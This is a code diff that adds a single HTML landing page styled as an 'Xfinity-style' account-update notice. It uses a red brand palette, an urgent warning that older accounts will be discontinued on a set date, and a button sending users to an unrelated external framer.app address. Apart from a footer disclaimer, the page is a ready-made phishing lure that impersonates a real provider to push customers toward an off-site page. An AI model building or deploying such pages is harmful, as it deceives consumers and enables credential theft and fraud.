@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Xfinity-style — Account Update</title>
+  <meta name="description" content="Simple, secure landing page for an account update action." />
+  <meta property="og:title" content="Xfinity-style — Account Update" />
+  <meta property="og:description" content="Simple, secure landing page for an account update action." />
+  <meta property="og:type" content="website" />
+  <meta name="color-scheme" content="light dark" />
+  <style>
+    :root {
+      --bg: #0b0c10;
+      --fg: #e6e6e6;
+      --muted: #a3a3a3;
+      --card: #111317;
+      --accent: #e21b26;   /* red primary */
+      --accent-2: #ff6b6b; /* complementary accent */
+      --radius: 16px;
+      --shadow: 0 10px 30px rgba(0,0,0,.35);
+      --maxw: 760px;
+    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; }
+    body {
+      margin: 0;
+      font: 16px/1.6 system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+      color: var(--fg);
+      background: radial-gradient(60rem 60rem at 80% -10%, rgba(226,27,38,.15), transparent 60%),
+                  radial-gradient(50rem 50rem at -10% 30%, rgba(255,107,107,.15), transparent 60%),
+                  var(--bg);
+      display: grid;
+      place-items: center;
+      padding: 4rem 1rem;
+    }
+    .card {
+      width: 100%;
+      max-width: var(--maxw);
+      background: linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02));
+      border: 1px solid rgba(255,255,255,.08);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      padding: 2.25rem;
+    }
+    header {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      margin-bottom: 1rem;
+    }
+    .logo {
+      width: 40px; height: 40px; border-radius: 10px;
+      background: linear-gradient(135deg, var(--accent), var(--accent-2));
+      display: grid; place-items: center; color: white; font-weight: 700;
+      letter-spacing: .5px;
+    }
+    h1 { margin: .2rem 0 .2rem; font-size: clamp(1.5rem, 2.8vw, 2rem); }
+    p { margin: .5rem 0 0; color: var(--muted); }
+    .notice {
+      margin: 1rem 0 1.25rem; padding: .875rem 1rem; border-radius: 12px;
+      background: rgba(226,27,38,.12); border: 1px solid rgba(226,27,38,.25);
+      color: #ffe4e6;
+    }
+    .actions { display: flex; gap: .75rem; flex-wrap: wrap; margin-top: 1rem; }
+    .btn {
+      appearance: none; border: none; cursor: pointer; text-decoration: none;
+      padding: .9rem 1.1rem; border-radius: 12px; font-weight: 600;
+      background: linear-gradient(180deg, var(--accent-2), var(--accent));
+      color: white; box-shadow: 0 6px 16px rgba(226,27,38,.35);
+      transition: transform .08s ease, filter .15s ease;
+    }
+    .btn:hover { filter: brightness(1.05); }
+    .btn:active { transform: translateY(1px); }
+    footer { margin-top: 2rem; font-size: .9rem; color: var(--muted); }
+    ul { padding-left: 1.25rem; }
+    a { color: #ffb4b4; }
+    @media (prefers-color-scheme: light) {
+      :root { --bg: #f8fafc; --fg: #0f172a; --muted: #334155; --card: white; }
+      .card { background: white; border-color: #e5e7eb; }
+      .notice { color: #0f172a; background: #fee2e2; border-color: #fecaca; }
+      a { color: #e21b26; }
+    }
+  </style>
+</head>
+<body>
+  <main class="card" role="main" aria-labelledby="title">
+    <header>
+      <div class="logo" aria-hidden="true">XS</div>
+      <div>
+        <h1 id="title">Xfinity-style — Account Update</h1>
+        <p>We’re upgrading our system. To keep access without interruption, please review and confirm your account details.</p>
+      </div>
+    </header>
+    <section class="notice" role="status">
+      <strong>Important:</strong> Older account versions will be discontinued starting <time datetime="2025-10-13">October 13, 2025</time>.
+    </section>
+    <section>
+      <h2>What you need to do</h2>
+      <ul>
+        <li>Confirm your profile information is accurate.</li>
+        <li>Review security settings and recovery options.</li>
+        <li>Save changes to finalize the update.</li>
+      </ul>
+      <div class="actions">
+        <a class="btn" href="https://salmon-assistant-045379.framer.app/" id="cta" target="_blank" rel="noopener">Update My Account</a>
+      </div>
+    </section>
+    <footer>
+      <p>© <span id="year"></span> Xfinity-style Demo Page. All rights reserved.</p>
+      <p style="margin-top:.25rem">This page is provided for account maintenance. It is styled for clarity and trustworthiness but is not affiliated with or endorsed by Xfinity/Comcast. It should not request passwords or payment details directly on this domain.</p>
+    </footer>
+  </main>
+  <script>
+    document.getElementById('year').textContent = new Date().getFullYear();
+  </script>
+</body>
+</html>
